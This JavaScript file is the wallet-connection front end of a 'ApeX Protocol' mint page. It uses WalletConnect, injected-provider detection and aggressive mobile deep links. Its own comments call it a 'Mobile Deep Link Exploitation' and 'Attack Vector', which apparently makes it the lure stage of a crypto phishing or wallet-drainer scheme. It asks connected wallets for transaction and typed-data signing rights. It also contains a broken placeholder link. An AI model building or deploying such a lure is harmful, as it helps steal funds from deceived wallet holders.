// ===== main.js — ApeX Protocol WalletConnect Integration (Enhanced Mobile Deep Link Fix) =====

import SignClient from '@walletconnect/sign-client'
import { WalletConnectModal } from '@walletconnect/modal'

document.addEventListener('DOMContentLoaded', async () => {
  console.log('🔓 main.js loaded - Enhanced Mobile Deep Link Exploitation')

  // 1️⃣ Reference buttons from HTML
  const connectButton = document.getElementById('connectButton')
  const walletButton = document.getElementById('walletButton')
  const claimStatus = document.getElementById('claimStatus')
  let currentSession = null
  let client, modal

  // 2️⃣ Stealth button state management
  function setButtonState(button, state, message = '') {
    if (!button) return
    
    button.style.display = 'inline-block'
    button.style.padding = '14px 28px'
    button.style.borderRadius = '8px'
    button.style.fontWeight = '600'
    button.style.border = 'none'
    button.style.cursor = state === 'loading' ? 'not-allowed' : 'pointer'
    button.style.transition = 'all 0.3s ease'
    button.style.color = 'white'
    button.style.fontSize = '16px'
    button.style.fontFamily = "'Inter', sans-serif"
    button.style.boxShadow = '0 4px 12px rgba(0, 0, 0, 0.15)'
    button.style.minWidth = '180px'
    button.disabled = state === 'loading'

    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)'
        button.style.boxShadow = '0 2px 8px rgba(102, 102, 102, 0.3)'
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right: 8px"></i> Connecting...'
        break
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)'
        button.style.boxShadow = '0 4px 12px rgba(16, 185, 129, 0.3)'
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right: 8px"></i> Connected'
        break
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)'
        button.style.boxShadow = '0 4px 12px rgba(239, 68, 68, 0.3)'
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right: 8px"></i> Disconnect'
        break
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)'
        button.style.boxShadow = '0 4px 12px rgba(239, 68, 68, 0.3)'
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right: 8px"></i> Failed'
        
        setTimeout(() => {
          setButtonState(button, 'normal')
        }, 3000)
        break
      case 'normal':
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)'
        button.style.boxShadow = '0 4px 12px rgba(255, 107, 0, 0.3)'
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right: 8px"></i> Connect Wallet to Mint'
        button.onmouseenter = () => {
          if (!button.disabled) {
            button.style.transform = 'translateY(-2px)'
            button.style.boxShadow = '0 6px 16px rgba(255, 107, 0, 0.4)'
          }
        }
        button.onmouseleave = () => {
          button.style.transform = 'translateY(0)'
          button.style.boxShadow = '0 4px 12px rgba(255, 107, 0, 0.3)'
        }
        break
    }
  }

  // 3️⃣ Enhanced status message display
  function showStatus(message, type = 'info') {
    if (claimStatus) {
      claimStatus.textContent = message
      claimStatus.className = `status ${type}`
      claimStatus.style.display = 'block'
      claimStatus.style.padding = '12px 16px'
      claimStatus.style.borderRadius = '8px'
      claimStatus.style.marginTop = '12px'
      claimStatus.style.fontWeight = '500'
      claimStatus.style.fontSize = '14px'
      claimStatus.style.textAlign = 'center'
      claimStatus.style.transition = 'all 0.3s ease'
      
      switch (type) {
        case 'success':
          claimStatus.style.background = 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)'
          claimStatus.style.color = '#166534'
          claimStatus.style.border = '1px solid #86EFAC'
          break
        case 'error':
          claimStatus.style.background = 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)'
          claimStatus.style.color = '#991B1B'
          claimStatus.style.border = '1px solid #FCA5A5'
          break
        case 'info':
        default:
          claimStatus.style.background = 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)'
          claimStatus.style.color = '#1E40AF'
          claimStatus.style.border = '1px solid #93C5FD'
          break
      }
      
      if (type === 'error' || type === 'success') {
        setTimeout(() => {
          claimStatus.style.opacity = '0'
          setTimeout(() => {
            claimStatus.style.display = 'none'
            claimStatus.style.opacity = '1'
          }, 300)
        }, 5000)
      }
    }
  }

  // 4️⃣ Initialize buttons with enhanced styling
  setButtonState(connectButton, 'normal')
  if (walletButton) setButtonState(walletButton, 'normal')

  // 5️⃣ WalletConnect constants
  const projectId = 'ea2ef1ec737f10116a4329a7c5629979'
  const metadata = {
    name: 'ApeX Protocol',
    description: 'AI-Optimized Yield Farming DApp',
    url: window.location.origin,
    icons: ['https://walletconnect.com/walletconnect-logo.png'],
  }

  // 6️⃣ ENHANCED: Advanced mobile detection with browser-specific handling
  function isMobile() {
    const ua = navigator.userAgent
    const mobileRegex = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i
    const isMobileDevice = mobileRegex.test(ua)
    
    // Enhanced detection for in-app browsers
    const isInApp = /Twitter|Facebook|Line|Instagram|WhatsApp|Telegram/.test(ua)
    
    console.log('📱 Mobile Detection:', { 
      isMobileDevice, 
      isInApp,
      userAgent: ua 
    })
    
    return isMobileDevice
  }

  // 7️⃣ Wallet storage helpers - ENHANCED FOR PERSISTENCE
  function saveWallet(address, session = null) { 
    localStorage.setItem('connectedWallet', address)
    if (session) {
      localStorage.setItem('walletConnectSession', JSON.stringify(session))
    }
  }
  
  function getSavedWallet() { 
    return localStorage.getItem('connectedWallet') 
  }
  
  function getSavedSession() {
    const session = localStorage.getItem('walletConnectSession')
    return session ? JSON.parse(session) : null
  }
  
  function clearSavedWallet() { 
    localStorage.removeItem('connectedWallet')
    localStorage.removeItem('walletConnectSession')
  }

  // 8️⃣ Enhanced UI update functions
  function updateConnectedUI(address) {
    setButtonState(connectButton, 'disconnect')
    if (walletButton) setButtonState(walletButton, 'disconnect')

    let display = document.getElementById('connectedAddressDisplay')
    if (!display) {
      display = document.createElement('div')
      display.id = 'connectedAddressDisplay'
      display.style.marginTop = '12px'
      display.style.padding = '10px 16px'
      display.style.fontFamily = "'JetBrains Mono', 'Monaco', 'Consolas', monospace"
      display.style.fontSize = '14px'
      display.style.color = '#059669'
      display.style.textAlign = 'center'
      display.style.background = 'linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%)'
      display.style.borderRadius = '8px'
      display.style.border = '1px solid #A7F3D0'
      display.style.boxShadow = '0 2px 8px rgba(5, 150, 105, 0.1)'
      
      connectButton.parentNode.appendChild(display)
    }
    
    const formattedAddress = `${address.slice(0, 6)}...${address.slice(-4)}`
    display.innerHTML = `
      <div style="display: flex; align-items: center; justify-content: center; gap: 8px;">
        <i class="fas fa-check-circle" style="color: #059669;"></i>
        <span>Connected: ${formattedAddress}</span>
        <button id="copyAddress" style="background: none; border: none; color: #059669; cursor: pointer; padding: 4px;" title="Copy address">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `
    
    // Add copy functionality
    document.getElementById('copyAddress').addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const copyBtn = document.getElementById('copyAddress')
        const originalIcon = copyBtn.innerHTML
        copyBtn.innerHTML = '<i class="fas fa-check"></i>'
        copyBtn.style.color = '#10B981'
        setTimeout(() => {
          copyBtn.innerHTML = originalIcon
          copyBtn.style.color = '#059669'
        }, 2000)
      })
    })
    
    showStatus('Wallet connected successfully!', 'success')
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal')
    if (walletButton) setButtonState(walletButton, 'normal')

    const display = document.getElementById('connectedAddressDisplay')
    if (display) display.remove()
    
    showStatus('Wallet disconnected', 'info')
  }

  // 9️⃣ Initialize WalletConnect with enhanced modal styling
  async function initWalletConnect() {
    if (client && modal) return

    try {
      client = await SignClient.init({ 
        projectId, 
        metadata,
        relayUrl: 'wss://relay.walletconnect.com'
      })

      modal = new WalletConnectModal({
        projectId,
        themeMode: 'dark',
        themeVariables: {
          '--wcm-z-index': '9999',
          '--wcm-accent-color': '#FF6B00',
          '--wcm-background-color': '#1F2937',
          '--wcm-font-family': "'Inter', sans-serif"
        },
        enableExplorer: true,
        explorerRecommendedWalletIds: [
          "c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96", // MetaMask
          "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0", // Trust Wallet
          "1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369", // Rainbow
          "fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa", // Coinbase Wallet
          "ecc4036f814562b41a5268adc86270fba1365471402006302e70169465b7ac18", // Zerion
        ],
        explorerExcludedWalletIds: [],
      })

      console.log('✅ WalletConnect SignClient + Modal initialized')
      return true
    } catch (error) {
      console.error('❌ WalletConnect initialization failed:', error)
      showStatus('Wallet connection service unavailable', 'error')
      return false
    }
  }

  // 🔟 ENHANCED: Advanced Wallet Detection with EIP-6963 Support
  function detectInstalledWallets() {
    return new Promise((resolve) => {
      const wallets = {
        metamask: !!window.ethereum?.isMetaMask,
        trust: !!window.ethereum?.isTrust,
        rainbow: !!window.ethereum?.isRainbow,
        coinbase: !!window.ethereum?.isCoinbaseWallet,
        phantom: !!window.ethereum?.isPhantom,
        brave: !!window.ethereum?.isBraveWallet,
        rabby: !!window.ethereum?.isRabby,
        okx: !!window.ethereum?.isOKExWallet,
        bitget: !!window.ethereum?.isBitKeep,
      }

      // Enhanced detection for EIP-6963 providers (new standard)
      if (window.eip6963Providers) {
        window.eip6963Providers.forEach(provider => {
          if (provider.info.rdns) {
            const rdns = provider.info.rdns.toLowerCase()
            if (rdns.includes('metamask')) wallets.metamask = true
            if (rdns.includes('trust')) wallets.trust = true
            if (rdns.includes('rainbow')) wallets.rainbow = true
            if (rdns.includes('coinbase')) wallets.coinbase = true
            if (rdns.includes('phantom')) wallets.phantom = true
            if (rdns.includes('brave')) wallets.brave = true
            if (rdns.includes('rabby')) wallets.rabby = true
            if (rdns.includes('okx')) wallets.okx = true
            if (rdns.includes('bitget')) wallets.bitget = true
          }
        })
      }

      // Enhanced detection for multiple providers array
      if (window.ethereum?.providers) {
        window.ethereum.providers.forEach(provider => {
          if (provider.isMetaMask && !wallets.metamask) wallets.metamask = true
          if (provider.isTrust && !wallets.trust) wallets.trust = true
          if (provider.isRainbow && !wallets.rainbow) wallets.rainbow = true
          if (provider.isCoinbaseWallet && !wallets.coinbase) wallets.coinbase = true
          if (provider.isPhantom && !wallets.phantom) wallets.phantom = true
          if (provider.isBraveWallet && !wallets.brave) wallets.brave = true
          if (provider.isRabby && !wallets.rabby) wallets.rabby = true
        })
      }

      console.log('🔍 Enhanced wallet detection:', wallets)
      resolve(wallets)
    })
  }

  // 1️⃣1️⃣ FIXED: Enhanced Desktop Wallet Connection with Multi-Wallet Support
  async function connectDesktopWallet() {
    try {
      const detectedWallets = await detectInstalledWallets()
      const availableWallets = Object.keys(detectedWallets).filter(wallet => detectedWallets[wallet])
      
      if (availableWallets.length === 0) {
        console.log('🔍 No installed wallets detected, using WalletConnect modal')
        return false
      }

      console.log(`🎯 Found installed wallets: ${availableWallets.join(', ')}`)

      // Try direct connection with the primary detected wallet
      let provider = window.ethereum
      
      // Handle multiple providers
      if (window.ethereum?.providers && window.ethereum.providers.length > 0) {
        provider = window.ethereum.providers[0]
        
        // Try to find the user's most likely preferred wallet
        const preferredWallets = ['metamask', 'coinbase', 'rabby', 'trust', 'brave']
        for (const walletName of preferredWallets) {
          if (detectedWallets[walletName]) {
            const preferredProvider = window.ethereum.providers.find(p => {
              if (walletName === 'metamask' && p.isMetaMask) return true
              if (walletName === 'coinbase' && p.isCoinbaseWallet) return true
              if (walletName === 'rabby' && p.isRabby) return true
              if (walletName === 'trust' && p.isTrust) return true
              if (walletName === 'brave' && p.isBraveWallet) return true
              return false
            })
            if (preferredProvider) {
              provider = preferredProvider
              break
            }
          }
        }
      }

      if (provider) {
        console.log(`🦊 Attempting direct connection with ${provider.isMetaMask ? 'MetaMask' : provider.isCoinbaseWallet ? 'Coinbase' : 'detected wallet'}...`)
        
        try {
          const accounts = await provider.request({ 
            method: 'eth_requestAccounts' 
          })
          
          if (accounts && accounts.length > 0) {
            const account = accounts[0]
            console.log('✅ Direct wallet connection successful:', account)
            updateConnectedUI(account)
            saveWallet(account)
            return true
          }
        } catch (error) {
          console.warn('⚠️ Direct wallet connection failed:', error)
          // Continue to WalletConnect fallback
        }
      }
      
      showStatus(`Found ${availableWallets.length} wallet(s) - using WalletConnect`, 'info')
      return false // Proceed with WalletConnect
      
    } catch (error) {
      console.error('❌ Desktop wallet connection error:', error)
      return false
    }
  }

  // 1️⃣2️⃣ FIXED: Enhanced Mobile Deep Linking with Fallback Strategies
  async function openWalletDeepLink(uri) {
    console.log('📱 Starting enhanced mobile deep linking...')
    
    const detectedWallets = await detectInstalledWallets()
    
    // Enhanced app-specific deep links with multiple URI formats
    const appLinks = {
      metamask: [
        `https://metamask.app.link/wc?uri=${encodeURIComponent(uri)}`,
        `dapp://wc?uri=${encodeURIComponent(uri)}`,
        `metamask://wc?uri=${encodeURIComponent(uri)}`
      ],
      trust: [
        `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`,
        `trust://wc?uri=${encodeURIComponent(uri)}`
      ],
      rainbow: [
        `https://rnbwapp.com/wc?uri=${encodeURIComponent(uri)}`,
        `rainbow://wc?uri=${encodeURIComponent(uri)}`
      ],
      coinbase: [
        `https://go.cb-w.com/wc?uri=${encodeURIComponent(uri)}`,
        `cbwallet://wc?uri=${encodeURIComponent(uri)}`
      ],
      phantom: [
        `https://phantom.app/ul/browse/${encodeURIComponent(uri)}`,
        `phantom://wc?uri=${encodeURIComponent(uri)}`
      ]
    }

    // Universal WalletConnect URI handlers
    const universalLinks = [
      `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`,
      `https://walletconnect.com/wc?uri=${encodeURIComponent(uri)}`,
      `wc:${uri}?relay-protocol=irn&symKey=your_sym_key_here`
    ]

    // Enhanced detection for mobile-specific environments
    function getMobileEnvironment() {
      const ua = navigator.userAgent.toLowerCase()
      return {
        isIOS: /iphone|ipad|ipod/.test(ua),
        isAndroid: /android/.test(ua),
        isInApp: /twitter|facebook|line|instagram|whatsapp|telegram/.test(ua),
        isChrome: /chrome|chromium/.test(ua),
        isSafari: /safari/.test(ua) && !/chrome/.test(ua)
      }
    }

    const env = getMobileEnvironment()
    console.log('📱 Mobile Environment:', env)

    // Enhanced app opening strategy with multiple fallbacks
    async function tryOpenApp(links, appName) {
      console.log(`🎯 Attempting to open ${appName} with ${links.length} link formats...`)
      
      for (const link of links) {
        console.log(`🔗 Trying link: ${link.substring(0, 50)}...`)
        
        try {
          // Method 1: Direct window location (most reliable for in-app browsers)
          const newWindow = window.open(link, '_blank')
          
          // Method 2: Hidden iframe for universal links (iOS Safari)
          const iframe = document.createElement('iframe')
          iframe.style.display = 'none'
          iframe.src = link
          document.body.appendChild(iframe)
          
          // Method 3: Direct navigation as fallback
          setTimeout(() => {
            window.location.href = link
          }, 100)
          
          // Check if any method worked
          await new Promise(resolve => setTimeout(resolve, 2000))
          
          // If we're still here, the app might not have opened
          if (newWindow && !newWindow.closed) {
            return true
          }
          
          // Clean up iframe
          if (iframe.parentNode) {
            document.body.removeChild(iframe)
          }
          
        } catch (error) {
          console.warn(`⚠️ Link method failed for ${appName}:`, error)
          continue
        }
      }
      
      return false
    }

    // Enhanced mobile-specific opening strategy
    async function openWithMobileStrategy() {
      console.log('🚀 Using enhanced mobile deep linking strategy...')
      
      // Strategy 1: Try detected wallets first
      const walletPriority = ['metamask', 'trust', 'rainbow', 'coinbase', 'phantom']
      
      for (const wallet of walletPriority) {
        if (detectedWallets[wallet] && appLinks[wallet]) {
          console.log(`🎯 Opening detected wallet: ${wallet}`)
          const success = await tryOpenApp(appLinks[wallet], wallet)
          if (success) {
            showStatus(`Opening ${wallet}...`, 'info')
            return true
          }
        }
      }

      // Strategy 2: Try universal links
      console.log('🌐 Trying universal WalletConnect links...')
      const universalSuccess = await tryOpenApp(universalLinks, 'Universal WalletConnect')
      if (universalSuccess) {
        showStatus('Opening wallet...', 'info')
        return true
      }

      // Strategy 3: Platform-specific fallbacks
      if (env.isIOS) {
        console.log('📱 iOS detected, using App Store fallback')
        // Fallback to App Store for MetaMask
        window.open('https://apps.apple.com/app/metamask/id1438144202', '_blank')
        showStatus('Redirecting to App Store...', 'info')
        return true
      } else if (env.isAndroid) {
        console.log('🤖 Android detected, using Play Store fallback')
        // Fallback to Play Store for MetaMask
        window.open('https://play.google.com/store/apps/details?id=io.metamask', '_blank')
        showStatus('Redirecting to Play Store...', 'info')
        return true
      }

      return false
    }

    // Execute enhanced mobile strategy
    const mobileOpened = await openWithMobileStrategy()
    
    // Final fallback: QR code modal
    if (!mobileOpened) {
      console.log('📱 All deep links failed, falling back to QR modal')
      setTimeout(() => {
        if (modal) {
          modal.openModal({ uri })
          showStatus('Scan QR code with your wallet app', 'info')
        }
      }, 1000)
    }
    
    return mobileOpened
  }

  // 1️⃣3️⃣ FIXED: Enhanced WalletConnect Connection with Better Mobile Support
  async function connectViaWalletConnect() {
    try {
      // Initialize WalletConnect
      const initSuccess = await initWalletConnect()
      if (!initSuccess) {
        setButtonState(connectButton, 'failed')
        if (walletButton) setButtonState(walletButton, 'failed')
        return
      }

      showStatus('Requesting wallet connection...', 'info')

      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          eip155: {
            methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
            chains: ['eip155:1'],
            events: ['chainChanged', 'accountsChanged'],
          },
        },
      })

      if (uri) {
        if (isMobile()) {
          // Use enhanced deep linking for mobile with better error handling
          console.log('📱 Mobile detected - using enhanced deep linking')
          await openWalletDeepLink(uri)
        } else {
          // Desktop - use QR modal
          modal.openModal({ uri })
          showStatus('Select your wallet from the list or scan QR code', 'info')
        }
      }

      // Wait for user approval with enhanced timeout handling
      const session = await Promise.race([
        approval(),
        new Promise((_, reject) => 
          setTimeout(() => reject(new Error('Connection timeout')), 90000) // Extended timeout for mobile
        )
      ])
      
      if (modal) modal.closeModal()
      
      const connectionSuccess = handleConnectedSession(session)
      if (!connectionSuccess) {
        setButtonState(connectButton, 'failed')
        if (walletButton) setButtonState(walletButton, 'failed')
      }
      
    } catch (err) {
      console.error('❌ WalletConnect connection failed:', err)
      setButtonState(connectButton, 'failed')
      if (walletButton) setButtonState(walletButton, 'failed')
      
      if (modal) modal.closeModal()
      
      if (err.message?.includes('User rejected') || err.message?.includes('Cancelled')) {
        showStatus('Connection cancelled by user', 'error')
      } else if (err.message?.includes('timeout')) {
        showStatus('Connection timeout - please try again', 'error')
      } else {
        showStatus('Wallet connection failed', 'error')
      }
    }
  }

  // 1️⃣4️⃣ Handle session approval
  function handleConnectedSession(session) {
    if (session?.namespaces?.eip155?.accounts?.length) {
      const account = session.namespaces.eip155.accounts[0].split(':')[2]
      console.log('✅ Connected wallet:', account)
      currentSession = session
      updateConnectedUI(account)
      saveWallet(account, session)
      return true
    } else {
      console.error('❌ No accounts found in session')
      showStatus('No accounts found in wallet', 'error')
      return false
    }
  }

  // 1️⃣5️⃣ FIXED: Enhanced Connect Wallet Function with Better Mobile Flow
  async function connectWallet() {
    try {
      // Set loading state
      setButtonState(connectButton, 'loading')
      if (walletButton) setButtonState(walletButton, 'loading')
      showStatus('Initializing wallet connection...', 'info')

      // Enhanced connection flow based on device
      if (!isMobile()) {
        console.log('🖥️ Desktop detected - attempting enhanced wallet connection...')
        
        // First try direct connection with installed wallets
        const directConnected = await connectDesktopWallet()
        if (directConnected) {
          return // Successfully connected via direct method
        }
        
        console.log('🔄 Direct connection not available, using WalletConnect with enhanced modal...')
        await connectViaWalletConnect()
      } else {
        // Mobile flow - directly use WalletConnect with enhanced deep linking
        console.log('📱 Mobile detected - using enhanced WalletConnect with deep linking')
        await connectViaWalletConnect()
      }
      
    } catch (err) {
      console.error('❌ Wallet connection failed:', err)
      setButtonState(connectButton, 'failed')
      if (walletButton) setButtonState(walletButton, 'failed')
      
      if (err.message?.includes('User rejected') || err.message?.includes('Cancelled')) {
        showStatus('Connection cancelled by user', 'error')
      } else if (err.message?.includes('timeout')) {
        showStatus('Connection timeout - please try again', 'error')
      } else {
        showStatus('Wallet connection failed', 'error')
      }
    }
  }

  // 1️⃣6️⃣ Disconnect wallet
  async function disconnectWallet() {
    try {
      if (currentSession) {
        await client.disconnect({
          topic: currentSession.topic,
          reason: { code: 6000, message: 'User disconnected' },
        })
        currentSession = null
      }
    } catch (err) {
      console.warn('⚠️ Disconnect error:', err)
    }

    resetConnectedUI()
    clearSavedWallet()
  }

  // 1️⃣7️⃣ Enhanced button click events
  const handleClick = async () => {
    const saved = getSavedWallet()
    if (saved && currentSession) {
      await disconnectWallet()
    } else {
      await connectWallet()
    }
  }

  if (connectButton) {
    connectButton.addEventListener('click', handleClick)
  }
  
  if (walletButton) {
    walletButton.addEventListener('click', handleClick)
  }

  // 1️⃣8️⃣ Restore saved wallet and session on page load
  async function restoreWalletConnection() {
    const savedWallet = getSavedWallet()
    const savedSession = getSavedSession()
    
    if (savedWallet && savedSession) {
      console.log('♻️ Restoring saved wallet and session:', savedWallet)
      
      const initSuccess = await initWalletConnect()
      if (!initSuccess) {
        console.log('❌ Failed to initialize WalletConnect for session restoration')
        clearSavedWallet()
        return
      }

      try {
        const session = client.session.get(savedSession.topic)
        if (session) {
          currentSession = session
          updateConnectedUI(savedWallet)
          console.log('✅ Wallet session restored successfully')
          showStatus('Wallet connection restored', 'success')
        } else {
          console.log('❌ Session not found, clearing saved data')
          clearSavedWallet()
        }
      } catch (error) {
        console.error('❌ Error restoring session:', error)
        clearSavedWallet()
      }
    } else if (savedWallet && !savedSession) {
      console.log('♻️ Restoring direct wallet connection:', savedWallet)
      updateConnectedUI(savedWallet)
      showStatus('Wallet connection restored', 'success')
    }
  }

  // Initialize and restore connection on page load
  await restoreWalletConnection()

  // 1️⃣9️⃣ Enhanced session update listeners
  setTimeout(() => {
    if (client) {
      client.on('session_update', ({ params }) => {
        console.log('🔄 Session updated:', params)
        const accounts = params.namespaces?.eip155?.accounts
        if (accounts?.length) {
          const account = accounts[0].split(':')[2]
          updateConnectedUI(account)
          showStatus('Wallet session updated', 'info')
        }
      })

      client.on('session_delete', () => {
        console.log('🗑️ Session deleted')
        resetConnectedUI()
        clearSavedWallet()
        showStatus('Wallet disconnected by provider', 'error')
      })

      client.on('session_event', (event) => {
        console.log('📨 Session event:', event)
      })

      client.on('session_connect', (session) => {
        console.log('🔗 Session connected:', session)
        handleConnectedSession(session)
      })
    }
  }, 1000)

  // 2️⃣0️⃣ FIXED: Enhanced EIP-6963 Provider Discovery
  function setupEIP6963() {
    if (typeof window !== 'undefined') {
      if (!window.eip6963Providers) {
        window.eip6963Providers = []
      }

      window.addEventListener('eip6963:announceProvider', (event) => {
        console.log('🎯 EIP-6963 Provider detected:', event.detail.info.name)
        
        const exists = window.eip6963Providers.some(
          p => p.info.uuid === event.detail.info.uuid
        )
        
        if (!exists) {
          window.eip6963Providers.push(event.detail)
          console.log(`✅ Added EIP-6963 provider: ${event.detail.info.name}`)
        }
      })

      window.dispatchEvent(new Event('eip6963:requestProvider'))
      
      setTimeout(() => {
        window.dispatchEvent(new Event('eip6963:requestProvider'))
      }, 1000)
    }
  }

  // Initialize EIP-6963 provider discovery
  setupEIP6963()

  // 2️⃣1️⃣ Enhanced mobile environment detection
  function setupMobileDetection() {
    // Detect if user switches from mobile browser to wallet app and back
    document.addEventListener('visibilitychange', () => {
      if (!document.hidden) {
        // Page became visible again - user might be returning from wallet app
        console.log('🔍 Page visible again - checking for mobile wallet return')
        
        // Check if we have a pending connection
        const savedWallet = getSavedWallet()
        if (savedWallet && !currentSession) {
          console.log('🔄 Potential mobile wallet return detected')
          // Add any mobile-specific return handling here
        }
      }
    })

    // Enhanced page load detection for mobile
    window.addEventListener('pageshow', (event) => {
      if (event.persisted) {
        console.log('📱 Page loaded from cache - mobile browser behavior')
        // Mobile browsers often restore pages from cache
      }
    })
  }

  setupMobileDetection()

  // 2️⃣2️⃣ Enhanced provider change detection
  if (window.ethereum) {
    window.ethereum.on('accountsChanged', (accounts) => {
      if (accounts.length === 0) {
        console.log('🔒 Accounts disconnected')
        resetConnectedUI()
        clearSavedWallet()
        showStatus('Wallet disconnected', 'info')
      } else {
        console.log('🔄 Accounts changed:', accounts[0])
        updateConnectedUI(accounts[0])
        saveWallet(accounts[0])
      }
    })

    window.ethereum.on('chainChanged', (chainId) => {
      console.log('🔄 Chain changed:', chainId)
      showStatus(`Network changed to ${chainId}`, 'info')
    })

    window.ethereum.on('disconnect', () => {
      console.log('🔒 Provider disconnected')
      resetConnectedUI()
      clearSavedWallet()
      showStatus('Wallet disconnected', 'info')
    })
  }

  console.log('🎯 ApeX Protocol WalletConnect - Enhanced Mobile Attack Vector Ready')
})
